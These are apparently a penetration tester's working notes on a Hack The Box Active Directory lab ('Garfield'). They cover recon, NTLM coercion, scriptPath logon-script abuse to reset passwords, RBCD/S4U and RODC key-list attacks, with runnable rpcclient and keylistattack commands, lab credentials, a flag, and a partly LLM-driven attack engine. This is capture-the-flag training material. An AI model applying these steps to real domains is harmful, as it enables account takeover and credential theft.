# Garfield — 10.129.16.228

## 23:19 — Recon
- DC01.garfield.htb — Windows Server 2019, Domain: GARFIELD
- Ports: DNS(53), Kerberos(88), RPC(135), SMB(445), LDAP(389), RDP(3389), WinRM(5985)
- SMB signing required, clock skew +8h
- Second IP on DC: 192.168.100.1 (internal network)
- No web services, no non-standard ports

## 23:23 — User Enumeration
- Valid: administrator, j.arbuckle, l.wilson (KDC_ERR_PREAUTH_FAILED)
- Disabled: guest, krbtgt
- No AS-REP roastable accounts
- Null SMB: STATUS_ACCESS_DENIED on share listing
- Anonymous LDAP: bind OK but search requires auth (operationsError 000004DC)
- RID cycling: STATUS_ACCESS_DENIED on lsarpc

## 23:24 — Password Spray
- 36 themed passwords against j.arbuckle and l.wilson: all failed
- No lockouts observed

## 07:18 — Authenticated Enumeration (IP changed to 10.129.17.44)
- j.arbuckle is standard domain user (IT Support group), NOT admin
- Shares: IPC$, NETLOGON, SYSVOL readable. ADMIN$/C$ NOT readable on this instance.
- SYSVOL `scripts/` is WRITABLE by j.arbuckle
- printerDetect.bat in scripts/ — not assigned as logon script initially

## 07:20 — LDAP Enumeration
- Users: administrator, j.arbuckle, l.wilson, l.wilson_adm, krbtgt_8245
- l.wilson: Remote Management Users, Remote Desktop Users
- l.wilson_adm: Tier 1, Remote Management Users, Remote Desktop Users
- RODC01 (192.168.100.2): Windows Server 2019 Datacenter — NOT reachable from us
- RODC has Administrator in msDS-RevealedUsers (password cached)
- No LAPS, no gMSA, no ADCS, no Kerberoastable SPNs
- Password policy: complexity OFF, no lockout, min length 7

## 07:25 — Bloodhound + ACL Analysis
- Bloodhound chain: l.wilson → ForceChangePassword → l.wilson_adm → ForceChangePassword+WriteAccountRestrictions → RODC01$ → ForceChangePassword → krbtgt_8245
- Bloodhound MISSED key ACE: IT Support has WriteProp on GUID bf9679a8
- Schema lookup: bf9679a8 = scriptPath (NOT member as initially thought)
- j.arbuckle can set scriptPath on ANY user in CN=Users container

## 08:26 — scriptPath Exploitation
- Set l.wilson's scriptPath to printerDetect.bat (SYSVOL scripts/)
- Modified bat with NTLM coercion → captured l.wilson NTLMv2 hash
- Hash NOT crackable: tried rockyou, 10M, 412K themed, darkc0de, rules — all failed
- Reverse shell bat blocked (likely AV/AMSI)

## 08:55 — Password Reset via scriptPath (FAILED)
- Modified bat to: `net user l.wilson_adm H4ck3d!@2026 /domain`
- Polled 10+ minutes, password never changed
- Also tried VBS ADSI SetPassword approach — same result
- Conclusion: logon simulation is NOT firing scriptPath execution

## 09:40 — IP changed to 10.129.17.46 (box reset)
- Re-staged scriptPath + bat immediately on fresh instance
- Set scriptPath on BOTH l.wilson and l.wilson_adm
- Polled 10+ minutes — NO logon script execution detected
- No responder activity at all on new instance

## 09:55 — NTLM Relay Attempts
- Created machine account FAKEPC$ (MAQ=10)
- Fixed ntlmrelayx port binding bug (needs `sleep infinity | ntlmrelayx` to keep stdin open)
- PetitPotam coercion works — DC01$ authenticates to our SMB
- Relay to LDAP: FAILED — "client requested signing, relaying to LDAP will not work"
- Relay to LDAPS: FAILED — "socket ssl wrapping error: Connection reset by peer" (channel binding enforced)
- NTLM relay is a DEAD PATH on this box

## 10:23 — IP changed to 10.129.17.33 (box reset #2)
- setup.sh ran within seconds of spawn
- VBS ADSI SetPassword bat uploaded, scriptPath set on l.wilson
- Polled 20+ minutes — no logon, no password change, no result.txt
- Responder captured ZERO traffic from this instance
- ntlmrelayx was on port 445 for 7+ hours — may have swallowed auth signals
- noPac (CVE-2021-42278): PATCHED — sAMAccountName rename rejected
- PrintNightmare (CVE-2021-1675): FAILED — 0x8001011b, no driver install rights

## 17:50 — Comprehensive ACL re-audit
- IT Support has ONLY WriteProp(scriptPath) on user objects — nothing else
- Domain Users/Authenticated Users have no unusual write permissions
- Tier 1 group has NO ACLs on any target objects
- Everyone has CREATE_CHILD on DNS zone → can create DNS records
- Port 2179 (vmrdp) open → Hyper-V running, RODC01 is likely a VM on DC01

## 18:00 — ADIDNS Exploitation
- dnstool.py (krbrelayx) creates records that RESOLVE on some instances
- nsupdate -g (Kerberos GSS-TSIG) creates records that ALWAYS RESOLVE
- Created wildcard *.garfield.htb → our IP (works on instance 10.129.17.33)
- Created pwned.garfield.htb, pwned3.garfield.htb → our IP
- WPAD blocked by Global Query Block List (GQBL)
- Wildcard DNS + ntlmrelayx: zero traffic captured in 5+ minutes

## 19:00 — IP changed to 10.129.17.70 (box reset #3)
- setup.sh ran immediately, clean bat (no SYSVOL redirect)
- Created FAKEPC$ machine account again
- Set FAKEPC$ dNSHostName = FAKEPC.garfield.htb → SUCCESS
- Added SPNs cifs/FAKEPC.garfield.htb, HOST/FAKEPC.garfield.htb → SUCCESS
- DNS: FAKEPC.garfield.htb → our IP (via nsupdate -g)
- RBCD set on FAKEPC$ allowing DC01$ to delegate (via rbcd.py)
- Attempted krbrelayx Kerberos relay: same stdin/port binding bug
- Printing vectors: no printers configured, can't add (ACCESS_DENIED), no printQueue create rights

## Dead Ends Summary
- Password spray: thousands of candidates, all failed
- Hash cracking: rockyou, 10M, 412K themed, rules — uncrackable
- NTLM relay: SMB signing blocks LDAP, channel binding blocks LDAPS
- Kerberos relay (krbrelayx): same port binding bug as ntlmrelayx
- Reverse shell via bat: AV/AMSI blocks PowerShell
- RODC01 (192.168.100.2): not reachable from attacker
- Logon script simulation: worked ONCE on first instance, never again on 3 subsequent resets
- noPac: PATCHED
- PrintNightmare: PATCHED/no rights
- ADIDNS wildcard: resolves but no passive traffic to capture
- Printer operations: all ACCESS_DENIED, no printers configured

## Still Alive
- FAKEPC$ machine account with SPN + DNS pointing to us (Kerberos target)
- scriptPath write + SYSVOL write (if logon simulation ever fires)
- PetitPotam coercion (DC01$ connects to us but relay fails)
- Password poller running in background

## Key Unsolved Questions
1. Why did l.wilson log in ONCE (first instance) but never again?
2. What triggers printerDetect.bat? Logon script? Scheduled task? Print event?
3. Can we fix krbrelayx port binding and do Kerberos-to-LDAP relay?
4. Is there a Hyper-V attack vector via port 2179?
5. What is the ACTUAL intended path on this hard box?

## 10:00 — Engine Run (pentest-engine v2 with drift detection + compaction)

### Iteration 0: WinRM Relay
- Plan: relay PetitPotam coercion to WinRM (port 5985) — EPA unknown
- Result: ntlmrelayx started, PetitPotam "Attack worked!" but relay never received connection
- Same issue as LDAP relay — coercion triggers but auth doesn't reach our listener
- **HARD BLOCK: ALL NTLM relay is dead on this box**

### Iteration 1: RODC PRG Membership Write
- Plan: add l.wilson to Allowed RODC Password Replication Group via WriteProp
- Result: `insufficientAccessRights` — WriteProp on RODC PRG is for scriptPath (bf9679a8), NOT member
- Earlier surface entry was WRONG: misidentified bf9679a8 as "member" attribute
- **HARD BLOCK: RODC PRG membership write denied**

### Iteration 2: Global Catalog Sensitive Attrs  
- Plan: query GC (3268) for userPassword/msSFU30Password/confidential attrs
- Result: same attribute set as LDAP 389, no extra creds
- Found: RPC-HTTP on 593, ADWS on 9389, confirmed RODC01 has Admin revealed
- **HARD BLOCK: GC adds no new data**

### Iteration 3: RPC-over-HTTP
- Plan: enumerate RPC interfaces over HTTP (port 593)  
- Result: 9 interfaces including DCSync (MS-DRSR), SAMR, LSARPC on HTTP port 49670
- But j.arbuckle lacks replication rights — same interfaces as SMB, no new access
- **HARD BLOCK: HTTP transport adds no new capabilities**

### Iteration 4: pending...
- 29 dead branches, 93 tested entries
- Engine compacting state (26KB → ~8KB via LLM)

### Key Observations from Engine Run
- Drift detection working: killed 2 executors at 10-tool limit (WinRM relay, RODC PRG)
- LLM compaction working: 38KB→4KB tested, 10KB→1.5KB surface
- Planner quality good with comprehensive hint — picking genuinely new angles
- Main bottleneck: planner calls (20-80s each), compaction overhead
- The bf9679a8 = scriptPath (NOT member) was a critical correction from the engine's ACL audit

### Iteration 4: Full TCP Scan (.178)
- Plan: full port scan on correct IP
- Result: 22 ports open. New: 139(netbios), 464(kpasswd5), high RPC ports
- kpasswd5 on 464 — Kerberos password change service (potential alternate password change path?)

### Iteration 5: RPC-over-HTTP (593)
- Plan: enumerate RPC interfaces over HTTP
- Result: 9 interfaces on ncacn_http port 49670 including:
  - **MS-DRSR (DCSync)** via ntdsai.dll
  - MS-LSAT, MS-SAMR, NETLOGON
- j.arbuckle lacks replication rights so DCSync won't work
- But: if we ever get higher-priv creds, HTTP transport bypasses SMB signing

### Iteration 6: Global Catalog (3268)
- Plan: query GC for sensitive/hidden attributes
- Result: same attrs as LDAP 389, no extra creds
- Confirmed RODC01 has Administrator in msDS-RevealedUsers

### Iteration 7: Hyper-V vmrdp (2179)
- Plan: check if j.arbuckle can access RODC01 VM console via vmrdp
- **IN PROGRESS** — this is interesting because vmrdp uses different ACLs than WMI
- If we can reach RODC01 console, we bypass the 192.168.100.0/24 routing issue

### Running totals
- 29 dead branches, 93 tested entries
- Engine iterations taking ~2 min each with compaction
- Planner making good picks now — systematically exploring new services

### Iteration 7 result: Hyper-V vmrdp (2179)
- Executor ran 10 tool calls: ncat, xfreerdp, nc, python3, nmap rdp scripts
- Result LOST — executor returned non-JSON, streaming parser didn't capture it
- Need to re-test manually: nmap -sV -p 2179 --script=rdp-enum-encryption,rdp-ntlm-info 10.129.17.178

### Iteration 8: Full TCP scan (.178) — drift killed
- Same scan we already did manually — 22 ports, nothing new
- Drift killed at 10 tools

### Engine bug identified
- When executor's claude -p returns non-JSON, the streaming parser drops the entire result
- Need to capture the final text even if it doesn't validate as JSON

### Hyper-V 2179 manual test
- Port accepts TCP connections but no banner — waits for protocol handshake
- nmap: "vmrdp?" — can't fingerprint, no RDP scripts trigger
- This is Hyper-V VM Connect protocol, not standard RDP
- Would need Hyper-V management tools (Windows-only) to interact
- **Likely dead end for Linux-based attacker — but confirms RODC01 is a Hyper-V VM**

### Iteration 4 (manual): Full Port Scan .178
- 22 open ports, all standard AD DC services
- No new attack surface — same ports as .228/.44
- vmrdp 2179 confirmed open, kpasswd 464, HTTP-RPC 593, ADWS 9389

### Summary after 5 engine iterations + manual scan
Dead ends: 30+. All standard AD attack paths exhausted.
Still alive:
1. scriptPath write (works but logon sim never fires)
2. PetitPotam coercion (works but relay fails everywhere)
3. FAKEPC$ machine account (SPN + DNS, but can't get anyone to auth to it)
4. DNS write (can create records, but no traffic to poison)

The box seems designed around triggering l.wilson's logon. We captured her hash ONCE on the first instance but it never fired again across 5+ resets. The SeBatchLogonRight GPO confirms a mechanism exists. What triggers it?

### Iteration 8: ADWS 9389
- SOAP/WCF protocol, not LDAP — ldapsearch fails on port 9389
- Requires WS-Management with Kerberos SPNEGO — can't use from Linux easily
- **HARD BLOCK: ADWS not exploitable without Windows PowerShell**

### Engine bug: lost results
- Executor returns findings but final JSON doesn't parse → state not updated
- Planner re-picks the same branch because tested.jsonl wasn't written
- Fixed by manually logging results. Need to fix streaming parser.

### Status after engine run
- **31 dead branches, ~97 tested entries**
- Every new service port has been explored and blocked
- Remaining attack surface is VERY narrow:
  1. kpasswd5 (464) — Kerberos password change, unexplored
  2. Triggering l.wilson logon somehow
  3. Something we're not seeing (thematic? timing? different protocol?)

### Engine Iteration 5: ADWS (9389)
- ADWS needs .NET WCF stack, not available from Linux
- LDAP on 9389 = "Can't contact LDAP server", SOAP probes = ConnectionReset
- **HARD BLOCK**

### Engine Iteration 6: Hyper-V vmrdp (2179)
- ncat raw + SSL probes, xfreerdp auth test, nmap rdp scripts
- Executor drift-killed at 10 tools before completing analysis
- Port open but vmrdp is a proprietary Hyper-V console protocol

### Engine Iteration 7: ForceChangePassword on l.wilson
- rpcclient setuserinfo2 l.wilson 23 → NT_STATUS_ACCESS_DENIED
- bloodyAD set password → same result
- j.arbuckle does NOT have ForceChangePassword on l.wilson
- **HARD BLOCK**

### Engine Run Summary (10 iterations total across 2 runs)
- 33 dead branches, 101 tested entries
- Novel findings: RPC-HTTP interfaces on port 49670, ADWS not Linux-accessible
- Corrected: bf9679a8 = scriptPath NOT member (critical fix)
- ALL standard AD attack paths now exhausted from j.arbuckle's access level

### Remaining Attack Surface (almost nothing left)
1. **scriptPath write** — only useful if logon sim fires (never does)
2. **PetitPotam coercion** — DC01$ auths but relay fails everywhere
3. **FAKEPC$ machine account** — SPN + DNS but no one authenticates to it
4. **DNS write** — can create records but no traffic to poison
5. **Hyper-V port 2179** — open but unexplored (vmrdp protocol)

### The Box Is Stuck At One Question
How do we get l.wilson's credentials? Every path leads here:
- Can't crack her hash (uncrackable)
- Can't reset her password (no ForceChangePassword)
- Can't trigger her logon script (never fires)
- Can't relay to get her TGT (all relay dead)
- Can't write to PRG (only scriptPath)
- The ONLY thing we can do is SET HER SCRIPTPATH and write to SYSVOL

Something about the Garfield theme or the scriptPath mechanism is the key we're missing.

## 10:31 — Focused scriptPath Engine Run (10 iterations)

### Iteration 0: kpasswd5 password reset
- changepasswd.py -protocol kpasswd -reset -altuser j.arbuckle → access denied
- kpasswd checks same ACL as SAMR — no password change rights
- **HARD BLOCK: kpasswd also denied**

## 10:36 — Manual scriptPath + Responder Setup
- Set scriptPath = \\10.10.17.114\share\x.bat on:
  - l.wilson ✓
  - l.wilson_adm ✓  
  - krbtgt_8245 ✓
  - administrator DENIED (protected or different ACL)
- Responder running on tun0, listening for auth
- Engine still running in parallel (iteration 1+)
- kpasswd5 test: access denied (same ACL as SAMR)

## 10:42 — BREAKTHROUGH: scriptPath trigger mechanism discovered

### How it works
The logon/scheduled task fires when **scriptPath is changed** (attribute change event, not a timer).
- Set scriptPath → task fires within ~5 min → executes the bat as l.wilson
- Toggle scriptPath (change to something else, change back) → fires again

### Evidence
- 10:42:49 — First hash captured after setting scriptPath to \\10.10.17.114\share\x.bat
- 10:49:00 — Second hash captured after toggling scriptPath (x.bat → printerDetect.bat)
- Both times, the `dir \\10.10.17.114\share` callback confirmed bat execution

### Why it didn't work on previous instances
On instances 2-5, we set scriptPath ONCE and waited. It probably fired once but we either:
- Didn't have responder running yet
- Had ntlmrelayx on port 445 swallowing the connection
- Modified the bat AFTER it fired (too late)

### Current status
- Bat runs as l.wilson ✓
- `net user l.wilson_adm P@ssw0rd2026! /domain` in the bat did NOT change the password
- Likely because `net user /domain` uses NetUserSetInfo which checks different perms than ForceChangePassword
- Need to use PowerShell `Set-ADAccountPassword` or SAMR-based approach instead

### Next steps
1. Fix the bat to use PowerShell or rpcclient-style password reset
2. Toggle scriptPath to trigger
3. Poll for l.wilson_adm password change
4. If password changes → WinRM as l.wilson_adm → continue chain

## 10:51 — l.wilson_adm PASSWORD CHANGED + WINRM SHELL

### Attack chain executed:
1. Set printerDetect.bat = PowerShell Set-ADAccountPassword -Identity l.wilson_adm -Reset
2. Toggle l.wilson scriptPath to trigger logon task
3. Bat fired within seconds, changed l.wilson_adm password to P@ssw0rd2026!
4. WinRM confirmed: Pwn3d!

### Creds
- l.wilson_adm : P@ssw0rd2026! (Tier 1, Remote Management Users, Remote Desktop Users)

## 10:55 — USER FLAG
f1ad2ce1429fe8a175400db776ed4ed4
Location: C:\Users\l.wilson_adm\Desktop\user.txt

## 19:26 — Fresh instance .158 — chain replay

### Confirmed working (scripted):
1. ✓ Upload bat to SYSVOL (smbclient j.arbuckle)
2. ✓ Toggle scriptPath → bat fires as l.wilson → l.wilson_adm password changed
3. ✓ rpcclient RODC01$ password reset
4. ✓ rpcclient krbtgt_8245 password reset
5. ✓ addcomputer PWNED$ created
6. ✓ RBCD set: PWNED$ → RODC01$
7. ✓ S4U2Proxy: Administrator ticket for cifs/RODC01$ obtained
8. ✓ S4U2Proxy altservice: Administrator ticket for cifs/DC01 obtained

### Failed on root step:
- secretsdump with altservice ticket → KRB_AP_ERR_MODIFIED (ticket encrypted with RODC01$ key, DC01 can't decrypt)
- DCSync as RODC01$ → access denied (RODC can't initiate replication)
- keylistattack with 4 salt variants → empty results (Administrator not in RODC allowed PRG for key list)
- Constrained delegation on RODC01$ → insufficientAccessRights

### Unsolved: How to go from RODC01$/krbtgt_8245 control to Administrator on DC01

## 19:49 — Engine UAC modification attempt
- l.wilson_adm CAN write userAccountControl on RODC01$ (WriteAccountRestrictions confirmed)
- TRUSTED_FOR_DELEGATION rejected: "Invalid argument" — incompatible with PARTIAL_SECRETS_ACCOUNT
- RODC01$ already has TRUSTED_TO_AUTH_FOR_DELEGATION (constrained w/ protocol transition)
- But msDS-AllowedToDelegateTo is NOT writable (insufficientAccessRights)
- So T2A4D flag is useless without being able to set the delegation target

## Root still needed
- Engine found user flag again, stopped thinking it was root
- l.wilson_adm has no high-value privs (no SeImpersonate, SeBackup)
- Need creative approach to read C:\Users\Administrator\Desktop\root.txt

## 20:02 — Step Back Analysis

### What we ACTUALLY have
1. j.arbuckle — domain user, WriteProp(scriptPath) on CN=Users, SYSVOL write
2. l.wilson_adm — WinRM shell on DC01 (confirmed Pwn3d)
3. RODC01$ — password changed (NewRodc1!), SMB auth on DC01, in Domain Controllers OU
4. krbtgt_8245 — password changed (NewKrb1!), NT hash known (e29fbd565f9e93af415d49169a2422c7)
5. PWNED$ — machine account with RBCD to RODC01$, S4U gives Administrator@cifs/RODC01$
6. The bat trick — can execute commands as l.wilson by toggling scriptPath

### What ALMOST worked (most promising leads)
1. **secretsdump -rodcNo -rodcKey**: DRSCrackNames SUCCEEDS (auth works!), DRSGetNCChanges fails with BAD_DN. This is the closest to root. The RODC key IS being accepted. The replication REQUEST format is wrong.
2. **keylistattack**: Runs without errors but returns EMPTY. Might be because we changed krbtgt_8245 password (invalidating cached secrets encryption). On a FRESH instance without the password change, this might work.
3. **RBCD S4U altservice**: Gets a ticket but KRB_AP_ERR_MODIFIED because ticket encrypted with RODC01$ key, DC01 can't decrypt.

### Critical insight I keep missing
The secretsdump BAD_DN error happens AFTER successful auth. That means:
- j.arbuckle + rodcNo + rodcKey = valid DRSUAPI session
- The issue is purely in the replication request parameters
- Maybe the `-just-dc-user Administrator` is looking up the wrong DN
- Or maybe we need to specify the RODC as the replication source

### What I HAVEN'T tried
1. secretsdump with different -just-dc-user formats (FQDN, SID, DN)
2. secretsdump with -use-vss (but j.arbuckle isn't admin)
3. On a FRESH instance: DON'T change krbtgt_8245, just run keylistattack immediately
4. The bat trick to have l.wilson run mimikatz/secretsdump locally on DC
5. Using RODC01$ to query its own secrets via ADWS or other interface
6. Pass-the-ticket with the Administrator@cifs/RODC01$ ticket against DC01's SMB

### The fundamental question
We have a valid Administrator Kerberos ticket for cifs/RODC01$ (from S4U2Proxy).
Can we USE this ticket against DC01 in any way? The service name is wrong (RODC01$ not DC01) but the PAC says Administrator. What if we present this ticket to a service on DC01 that accepts RODC01$ service tickets?

### Pattern I'm not seeing
The box is called Garfield. We used the scriptPath trick (Garfield connection: Garfield is lazy, makes others do work). The RODC is named RODC01. The RODC has Administrator cached. The intended path probably goes through the RODC somehow — maybe the keylistattack IS the answer, we just need the right key.

### Next steps to try
1. FRESH INSTANCE: Replay to l.wilson_adm, change RODC01$ password ONLY, DON'T change krbtgt_8245, run keylistattack with ORIGINAL krbtgt_8245 key derived from... we still don't know the original password.
2. Try secretsdump -rodcNo with explicit DN instead of username
3. Try pass-the-ticket with RODC01$ Admin ticket against DC01
4. Research: how does impacket's -rodcNo flag actually work? What DN does it use?

## 00:05 — Source code analysis of keylistattack.py

### How keylistattack works (from impacket source):
1. getAllowedUsersToReplicate() — enumerates users via SAMR from Allowed RODC PRG
2. createPartialTGT() — forges a TGT encrypted with rodcKey, kvno = rodcNo << 16
3. getFullTGT() — sends TGS-REQ with KERB_KEY_LIST_REQ padata
4. DC decrypts partial TGT with krbtgt_8245's AES key
5. If decryption succeeds, DC returns full TGT with user's NT hash in key list

### Why it returns empty:
The AES key we provide doesn't match what AD stored for krbtgt_8245.
After rpcclient setuserinfo2, AD derives AES keys server-side.
The salt AD uses determines the key. For krbtgt: salt = <REALM>krbtgt

### THE FIX (untested, box died):
Password: NewKrb1!
Salt: GARFIELD.HTBkrbtgt (NOT GARFIELD.HTBkrbtgt_8245)
AES256: 8de6f7578fd335e0a536f7b1b5747dc705b7aeda5ed6df34c3ab94f63b768a37

### Script for next instance:
```
export PATH=/home/hacker/.local/bin:$PATH
# 1. Replay to l.wilson_adm (run pwn.sh steps 1-3)
# 2. Change RODC01$ password
rpcclient -U 'l.wilson_adm%P@ssw0rd2026!' $TARGET -c 'setuserinfo2 RODC01$ 23 NewRodc1!'
# 3. Change krbtgt_8245 password  
rpcclient -U 'RODC01$%NewRodc1!' $TARGET -c 'setuserinfo2 krbtgt_8245 23 NewKrb1!'
# 4. Compute AES with STANDARD krbtgt salt (no suffix)
AES=$(python3 -c "from impacket.krb5.crypto import string_to_key; from impacket.krb5.constants import EncryptionTypes; print(string_to_key(EncryptionTypes.aes256_cts_hmac_sha1_96.value, 'NewKrb1!', 'GARFIELD.HTBkrbtgt').contents.hex())")
# 5. Run keylistattack
faketime '+8 hours' keylistattack.py "garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978@DC01.garfield.htb" -rodcNo 8245 -rodcKey "$AES" -dc-ip $TARGET -full
```

## 09:02 — Root flag exfil debugging

### What works:
- Bat fires on scriptPath toggle ✓
- Bat can write to C:\Windows\Temp ✓ (root_flag.txt existed earlier)
- Bat can run PowerShell ✓

### What doesn't work:
- l.wilson_adm can't read files l.wilson creates (different owner ACL)
- l.wilson can't write to SYSVOL local path
- Invoke-Command to RODC01 from inside bat — UNKNOWN (output goes to file we can't read)

### Key question:
Does the Invoke-Command to RODC01 actually WORK from inside the bat?
The temp files existed but we couldn't read them to confirm the content.

### Next: need fresh instance
- Clean bat that writes Invoke-Command output + errors to C:\Users\Public
- Test if C:\Users\Public is writable by logon scripts
- If Invoke-Command fails, may need to use the SMB share approach with port 445 free

## 09:10 — Method Review

### The core issue with root exfil:
We've been trying to use Invoke-Command from l.wilson's logon script to reach RODC01. 
But we have ZERO evidence it works. The temp files we saw earlier (root_flag.txt, rf2.txt) 
might have been empty or contained errors — we couldn't read them.

### What we KNOW works:
1. Bat fires on scriptPath toggle ✓
2. Bat can write to C:\Windows\Temp ✓  
3. Bat can run PowerShell ✓
4. l.wilson has real Kerberos TGT in logon script context
5. DC01 can reach RODC01 (192.168.100.2) ✓
6. l.wilson is in Remote Management Users domain-wide

### What we DON'T know:
1. Does Invoke-Command from l.wilson's logon script to RODC01 actually succeed?
2. Does the logon script have delegation rights to RODC01?
3. Is root.txt actually on RODC01?

### Rethinking the approach:
Maybe the root flag ISN'T on RODC01. We assumed it is because Admin profile 
doesn't exist on DC01. But what if:
- Admin profile gets created when we log in as Admin
- We need to actually BECOME admin, not just read the flag
- The RBCD S4U altservice approach was close but needs refinement

### New idea: combo bat approach
Upload ONE bat that does BOTH password change AND exfil in a single trigger.
This conserves the trigger mechanism. If Invoke-Command fails silently,
the SMB callback (dir \\attacker\share) will still fire — proving the bat ran.
If we get the SMB callback but no root.txt, we know Invoke-Command failed.

## 10:03 — Comprehensive Review + New Idea

### Reviewing 229 tested entries: 36 confirmed, 70 hard blocked

### What I keep overlooking:
The bat runs as l.wilson with a REAL Kerberos session. The double-hop 
blocks Invoke-Command (delegation). But what about NTLM auth?

net use \\192.168.100.2\C$ /user:garfield.htb\RODC01$ NewRodc1!

This uses NTLM (IP-based = no Kerberos). NTLM doesn't need delegation.
If RODC01 accepts NTLM auth from RODC01$ with our changed password,
we can mount C$ and read root.txt directly.

Previous failure: RODC01$ auth failed with 0x80090322 — but that was 
KERBEROS (via Invoke-Command). NTLM is a different auth path.

### Also untried:
- net use from l.wilson_adm WinRM (NTLM to RODC01 IP — no double-hop issue with NTLM!)
- smbclient-style access from inside bat via PowerShell New-SmbMapping

## 10:04 — NTLM auth to RODC01 findings

### KEY FINDING: l.wilson_adm CAN authenticate to RODC01 via NTLM
- net use \\192.168.100.2\C$ with l.wilson_adm creds → Error 5 (access denied, NOT wrong password)
- This means: NTLM auth works, l.wilson_adm password is known to RODC01
- But: no admin share access (C$, NETLOGON both Error 5)

### RODC01$ changed password NOT replicated
- net use with RODC01$:NewRodc1! → Error 86 (wrong password)
- RODC01 still has the OLD RODC01$ password
- rpcclient password change on DC01 hasn't replicated to RODC

### Next: try WinRM to RODC01 with NTLM explicit creds
- l.wilson_adm can auth via NTLM to RODC01
- WinRM on port 5985 may be open on RODC01 (need to verify)
- Use PowerShell New-PSSession with explicit creds and -Authentication Negotiate
- This avoids Kerberos delegation entirely

## 10:08 — FULL STRATEGY (stop executing, think)

### What we have (assets):
1. l.wilson_adm WinRM on DC01 — can run commands
2. l.wilson_adm can NTLM auth to RODC01 (confirmed error 5 not 86)
3. Bat trick — runs commands as l.wilson with real Kerberos TGT
4. RODC01 reachable from DC01 at 192.168.100.2 (ping 2ms)
5. WinRM port 5985 status on RODC01 — UNKNOWN (never confirmed)
6. SMB port 445 on RODC01 — UNKNOWN (net use got error 5, meaning 445 IS open)

### Wait — SMB port 445 IS open on RODC01
Error 5 = access denied AFTER connecting. If port was closed we'd get 
"network path not found" or timeout. Error 5 means TCP connected, SMB 
negotiated, auth succeeded, but share access denied.

### The real question: what can l.wilson_adm access on RODC01?
She can't access C$ or NETLOGON. But what about:
- SYSVOL share?
- IPC$ share (for RPC)?
- Custom shares?
- WinRM (port 5985)?

### Strategy:
1. Enumerate RODC01 shares via l.wilson_adm (net view \\192.168.100.2)
2. Test WinRM on RODC01 (Test-WSMan 192.168.100.2)
3. If WinRM works with explicit NTLM creds → Invoke-Command to read root.txt
4. If not → enumerate what shares ARE accessible and look for root.txt there
5. If nothing → use the bat trick with NTLM net use (l.wilson has a real session, may work differently)

### Key insight I keep missing:
The double-hop blocks KERBEROS delegation. But NTLM with explicit creds 
in New-PSSession -Authentication Negotiate should work because we're 
providing the password directly, not delegating.

This is DIFFERENT from Invoke-Command without -Credential (which tries 
to delegate the existing session). With explicit -Credential -Authentication 
Negotiate, it's a fresh NTLM auth — no delegation needed.

### Execute as ONE script, not iterative guessing:
1. Test-WSMan 192.168.100.2 (is WinRM open?)
2. If yes: New-PSSession with explicit NTLM creds
3. If session works: Invoke-Command to read root.txt
4. All via crackmapexec winrm to DC01

## 10:09 — Strategy Results

### [1] WinRM on RODC01: OPEN ✓
Test-WSMan returned ProductVendor: Microsoft Corporation, Stack 3.0
WinRM IS running on RODC01 (192.168.100.2:5985)

### [2] Share enumeration: Error 5 (access denied)
Can't enumerate shares. But this is net view which needs specific perms.

### [3] New-PSSession: EMPTY OUTPUT
No error, no output. CME might be swallowing the output.
This is AMBIGUOUS — could be success (output suppressed) or silent failure.

### [4] Invoke-Command root.txt: EMPTY OUTPUT  
Same — no error, no output. Either:
a) It worked but CME suppressed the output
b) It failed silently
c) root.txt doesn't exist on RODC01

### CRITICAL: CME keeps returning empty for PowerShell output
This has been a recurring issue. CME -x with PowerShell often returns empty.
We need to capture output differently — write to a file we CAN read,
or use CME -X (PowerShell mode) which might handle output differently.

### Next: re-run step 3+4 with output to a file we can read
Since l.wilson_adm can't read l.wilson's files, and can't write to 
shared locations... what if we pipe the Invoke-Command output back 
through the SAME WinRM session? Like:
$result = Invoke-Command ...; Write-Output $result

Or use -X flag instead of -x.

## 10:10 — Invoke-Command to RODC01 with explicit creds: FAILED

### Error: 0x8009030e — "A specified logon session does not exist"
This is STILL the double-hop problem. Even with explicit -Credential and 
-Authentication Negotiate, the error is the same: "logon session does not exist."

The issue: when CME connects to DC01 via WinRM (NTLM), the session on DC01 
runs as l.wilson_adm but with a NETWORK logon token (type 3). This token 
cannot be used to authenticate outbound, even with explicit credentials, 
because WinRM's security constrains outbound auth from network logon sessions.

### The ONLY way to get outbound auth from DC01:
1. Interactive logon (type 2) — RDP or console login
2. Kerberos with delegation — blocked (no unconstrained/constrained delegation)
3. CredSSP — allows credential forwarding, but needs to be enabled on DC01

### Wait: the BAT runs as l.wilson with an INTERACTIVE logon (type 2 or 10)
The logon script fires from a scheduled task / user logon — that's interactive.
An interactive session CAN authenticate outbound.

So the bat SHOULD be able to Invoke-Command to RODC01... but we confirmed 
the bat's Invoke-Command HANGS (rf.txt never created).

### Why does the bat's Invoke-Command hang?
Maybe it's not hanging — maybe it succeeds but the output redirect 
to C:\Windows\Temp fails. Or the Invoke-Command timeout is very long 
and the bat just takes >60s to complete.

### NEW IDEA: Put Invoke-Command in the bat with explicit timeout
Start-Job + Wait-Job -Timeout 10
Then write result to SYSVOL\scripts via net use \\DC01\SYSVOL (local to DC01, not double-hop)

## 10:15 — Bat trigger may be exhausted on .18.14 too

### Evidence:
- combo.bat fired (l.wilson_adm password changed) — trigger #1 ✓
- icdebug.bat fired (ic_debug.txt created) — trigger #2 ✓  
- copyout.bat NOT fired (no SMB callback, no file in loot) — trigger #3 ✗

### Pattern across instances:
- .178: bat fired ~2-3 times then stopped
- .167: bat fired once (password change) then stopped  
- .18.14: bat fired twice then stopped

### Hypothesis: the trigger has a LIMITED number of fires per instance
Maybe 2-3 fires max. After that, the logon simulation stops responding.
This means we need to accomplish EVERYTHING in ONE bat, ONE trigger.

### The winning strategy:
Write ONE bat that does ALL of:
1. Set-ADAccountPassword for l.wilson_adm
2. Invoke-Command to RODC01 with Start-Job timeout
3. Copy result to \\attacker\share
4. Also copy as fallback to C:\Users\Public

Upload it BEFORE the first toggle. ONE toggle fires it. Done.

### But we already used 2 triggers on .18.14
Need ANOTHER fresh instance. This time: ONE bat, ONE toggle.
